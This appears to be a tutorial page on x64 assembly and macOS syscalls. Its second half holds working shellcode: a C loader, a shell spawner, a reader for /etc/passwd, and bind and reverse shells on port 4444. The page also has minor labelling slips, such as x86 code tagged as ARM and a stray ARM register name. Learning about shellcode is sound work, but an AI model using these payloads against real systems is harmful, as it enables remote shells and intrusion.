# Introduction to x64

{{#include ../../../banners/hacktricks-training.md}}

## **Introduction to x64**

x64，也称为 x86-64，是一种主要用于桌面和服务器计算的 64 位处理器架构。它起源于 Intel 生产的 x86 架构，后来被 AMD 采用并命名为 AMD64，现今是个人计算机和服务器中普遍使用的架构。

### **Registers**

x64 在 x86 架构的基础上扩展，具有 **16 个通用寄存器**，标记为 `rax`、`rbx`、`rcx`、`rdx`、`rbp`、`rsp`、`rsi`、`rdi`，以及 `r8` 到 `r15`。每个寄存器可以存储一个 **64 位**（8 字节）值。这些寄存器还具有 32 位、16 位和 8 位的子寄存器，以便于兼容性和特定任务。

1. **`rax`** - 传统上用于 **函数的返回值**。
2. **`rbx`** - 通常用作内存操作的 **基址寄存器**。
3. **`rcx`** - 常用于 **循环计数器**。
4. **`rdx`** - 在各种角色中使用，包括扩展算术操作。
5. **`rbp`** - 堆栈帧的 **基指针**。
6. **`rsp`** - **堆栈指针**，跟踪堆栈的顶部。
7. **`rsi`** 和 **`rdi`** - 用于字符串/内存操作中的 **源** 和 **目标** 索引。
8. **`r8`** 到 **`r15`** - 在 x64 中引入的额外通用寄存器。

### **Calling Convention**

x64 的调用约定在不同操作系统之间有所不同。例如：

- **Windows**：前 **四个参数** 通过寄存器 **`rcx`**、**`rdx`**、**`r8`** 和 **`r9`** 传递。进一步的参数被推入堆栈。返回值在 **`rax`** 中。
- **System V（通常用于类 UNIX 系统）**：前 **六个整数或指针参数** 通过寄存器 **`rdi`**、**`rsi`**、**`rdx`**、**`rcx`**、**`r8`** 和 **`r9`** 传递。返回值也在 **`rax`** 中。

如果函数有超过六个输入，**其余参数将通过堆栈传递**。**RSP**，堆栈指针，必须 **16 字节对齐**，这意味着它指向的地址在任何调用发生之前必须能被 16 整除。这意味着通常我们需要确保在进行函数调用之前，RSP 在我们的 shellcode 中是正确对齐的。然而，在实践中，即使不满足此要求，系统调用通常也能正常工作。

### Calling Convention in Swift

Swift 有其自己的 **调用约定**，可以在 [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64) 中找到。

### **Common Instructions**

x64 指令集丰富，保持与早期 x86 指令的兼容性，并引入了新的指令。

- **`mov`**：**移动**一个值从一个 **寄存器** 或 **内存位置** 到另一个。
- 示例：`mov rax, rbx` — 将 `rbx` 中的值移动到 `rax`。
- **`push`** 和 **`pop`**：将值推入或弹出 **堆栈**。
- 示例：`push rax` — 将 `rax` 中的值推入堆栈。
- 示例：`pop rax` — 将堆栈顶部的值弹出到 `rax`。
- **`add`** 和 **`sub`**：**加法**和 **减法** 操作。
- 示例：`add rax, rcx` — 将 `rax` 和 `rcx` 中的值相加，并将结果存储在 `rax` 中。
- **`mul`** 和 **`div`**：**乘法**和 **除法** 操作。注意：这些在操作数使用方面有特定行为。
- **`call`** 和 **`ret`**：用于 **调用** 和 **从函数返回**。
- **`int`**：用于触发软件 **中断**。例如，`int 0x80` 用于 32 位 x86 Linux 的系统调用。
- **`cmp`**：**比较**两个值并根据结果设置 CPU 的标志。
- 示例：`cmp rax, rdx` — 比较 `rax` 和 `rdx`。
- **`je`、`jne`、`jl`、`jge`、...**：**条件跳转**指令，根据先前的 `cmp` 或测试结果改变控制流。
- 示例：在 `cmp rax, rdx` 指令之后，`je label` — 如果 `rax` 等于 `rdx`，则跳转到 `label`。
- **`syscall`**：在某些 x64 系统（如现代 Unix）中用于 **系统调用**。
- **`sysenter`**：在某些平台上的优化 **系统调用** 指令。

### **Function Prologue**

1. **推送旧的基指针**：`push rbp`（保存调用者的基指针）
2. **将当前堆栈指针移动到基指针**：`mov rbp, rsp`（为当前函数设置新的基指针）
3. **在堆栈上分配局部变量的空间**：`sub rsp, <size>`（其中 `<size>` 是所需的字节数）

### **Function Epilogue**

1. **将当前基指针移动到堆栈指针**：`mov rsp, rbp`（释放局部变量）
2. **从堆栈中弹出旧的基指针**：`pop rbp`（恢复调用者的基指针）
3. **返回**：`ret`（将控制权返回给调用者）

## macOS

### syscalls

有不同类别的系统调用，您可以 [**在这里找到它们**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
然后，您可以在[**此网址**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**中找到每个系统调用号：**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
为了从 **Unix/BSD 类** 调用 `open` 系统调用 (**5**)，您需要添加它：`0x2000000`

因此，调用 open 的系统调用编号将是 `0x2000005`

### Shellcodes

编译：
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
提取字节：
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
<details>

<summary>测试 shellcode 的 C 代码</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

取自[**这里**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)并进行了解释。

{{#tabs}}
{{#tab name="with adr"}}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}

{{#tab name="使用堆栈"}}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}
{{#endtabs}}

#### 使用 cat 读取

目标是执行 `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`，因此第二个参数 (x1) 是一个参数数组（在内存中这意味着一堆地址）。
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### 使用 sh 调用命令
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

来自 [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) 的 Bind shell 在 **port 4444**
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### 反向 Shell

来自 [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html) 的反向 shell。反向 shell 到 **127.0.0.1:4444**
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
{{#include ../../../banners/hacktricks-training.md}}
